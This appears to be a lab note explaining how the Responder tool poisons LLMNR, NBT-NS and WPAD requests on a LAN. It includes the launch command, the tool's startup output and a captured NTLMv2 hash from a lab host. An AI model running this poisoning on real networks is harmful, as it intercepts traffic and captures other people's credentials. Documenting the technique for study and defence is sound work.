# `The Responder`

`Responder` is like a `rogue device` sitting in middle and listening.

`Responder` allows us to perform Man-in-the-Middle attacks by poisoning any  `Link-Local Multicast Name Resolution (LLMNR)`,  `NetBIOS Name Service (NBT-NS)`, and `Web Proxy Auto-Discovery (WPAD)` requests that are detected on LAN.

Since these protocols rely on requests broadcasted on the local network, our rogue device/Responder would also receive these requests. 

However, Responder will actively listen to the requests and send poisoned responses telling the requesting host that our IP is associated with the requested hostname. By poisoning these requests, Responder attempts to force the client to connect to our Attack Machine. In the same line, it starts to host several servers such as SMB, HTTP, SQL, and others to capture these requests and force authentication. 



We can use tool `Responder` to achieve this, Responder is a LLMNR, NBT-NS and MDNS poisoner.
https://github.com/SpiderLabs/Responder


It will answer to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix (see: http://support.microsoft.com/kb/163409). By default, the tool will only answer to File Server Service request, which is for SMB.


As soon as any event occurs we get response

┌──(kali㉿kali)
└─$ `sudo responder -I eth0 -dwv`
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.204.130]
    Responder IPv6             [fe80::9d5c:a00d:b7e2:bfdf]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-C6JDIDMPUQ1]
    Responder Domain Name      [6KCY.LOCAL]
    Responder DCE-RPC Port     [45182]

[+] Listening for events...                                                                                          

[SMB] NTLMv2-SSP Client   : 192.168.204.136
[SMB] NTLMv2-SSP Username : DESKTOP-DIKLERO\DoshiJi
[SMB] NTLMv2-SSP Hash     : DoshiJi::DESKTOP-DIKLERO:ffe87cbac2857cdf:B2B71CD6E38A2E7B5FFF3E0FE6B53F49:010100000000000080C8A9C0657EDA01960ABE7476025748000000000200080036004B004300590001001E00570049004E002D00430036004A004400490044004D00500055005100310004003400570049004E002D00430036004A004400490044004D0050005500510031002E0036004B00430059002E004C004F00430041004C000300140036004B00430059002E004C004F00430041004C000500140036004B00430059002E004C004F00430041004C000700080080C8A9C0657EDA01060004000200000008003000300000000000000001000000002000000C697C64DB1143A2ACB60874C4ADE072FFC0CCBACAA56E2148A37FF887F7E39F0A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003200300034002E003100330030000000000000000000 